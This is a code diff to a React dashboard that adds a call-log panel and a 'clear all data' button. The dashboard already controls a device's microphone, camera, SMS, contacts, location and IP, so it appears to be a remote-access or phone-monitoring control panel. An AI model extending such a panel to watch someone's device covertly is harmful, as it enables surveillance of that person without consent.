@@ -1,10 +1,11 @@
 import React, { useState, useEffect, useCallback } from "react";
-import { getStatus, getLogs, killServer, disconnectClient, fetchTelemetry } from "./api/client";
+import { getStatus, getLogs, killServer, disconnectClient, fetchTelemetry, clearAllData } from "./api/client";
 import { useTranslation } from "./context/LanguageContext";
 import ThemeSelector from "./components/ThemeSelector";
 import MicControl from "./components/MicControl";
 import SmsManager from "./components/SmsManager";
 import ContactsManager from "./components/ContactsManager";
+import CallLogsManager from "./components/CallLogsManager";
 import LogsView from "./components/LogsView";
 import CameraManager from "./components/CameraManager";
 import { Badge } from "./components/ui/badge";
@@ -40,6 +41,7 @@ import {
   Cpu,
   Zap,
   Thermometer,
+  Paintbrush,
 } from "lucide-react";
 
 export default function App() {
@@ -53,6 +55,7 @@ export default function App() {
   const [queryingTelemetry, setQueryingTelemetry] = useState(false);
   const [copiedCoords, setCopiedCoords] = useState(false);
   const [copiedIp, setCopiedIp] = useState(false);
+  const [clearingData, setClearingData] = useState(false);
 
   const refreshData = useCallback(async () => {
     try {
@@ -101,6 +104,18 @@ export default function App() {
         await killServer();
       } finally {
         setKilling(false);
+      }
+    }
+  };
+
+  const handleClearAllData = async () => {
+    if (window.confirm(t("clear_data.confirm"))) {
+      setClearingData(true);
+      try {
+        await clearAllData();
+        await refreshData();
+      } finally {
+        setClearingData(false);
       }
     }
   };
@@ -227,6 +242,17 @@ export default function App() {
                 {t("app.disconnect")}
               </Button>
             )}
+
+            <Button
+              size="sm"
+              variant="outline"
+              disabled={clearingData}
+              onClick={handleClearAllData}
+              className="h-7 w-7 p-0 text-dim hover:text-amber-400 hover:border-amber-500/50"
+              title={t("clear_data.button")}
+            >
+              <Paintbrush className={`w-3 h-3 ${clearingData ? "animate-spin" : ""}`} />
+            </Button>
 
             <Button
               size="sm"
@@ -524,21 +550,23 @@ export default function App() {
           </Card>
         </div>
 
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 items-start">
-          <div className="lg:col-span-1 h-full">
+        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-4 items-start">
+          <div className="h-full space-y-4">
             <MicControl status={status} onRefresh={refreshData} />
             {status?.camera_enabled && (
-              <div className="mt-4">
-                <CameraManager status={status} onRefresh={refreshData} />
-              </div>
+              <CameraManager status={status} onRefresh={refreshData} />
             )}
           </div>
 
-          <div className="lg:col-span-1 h-full">
+          <div className="h-full">
+            <CallLogsManager status={status} onRefresh={refreshData} />
+          </div>
+
+          <div className="h-full">
             <SmsManager status={status} onRefresh={refreshData} />
           </div>
 
-          <div className="lg:col-span-1 h-full">
+          <div className="h-full">
             <ContactsManager status={status} onRefresh={refreshData} />
           </div>
         </div>
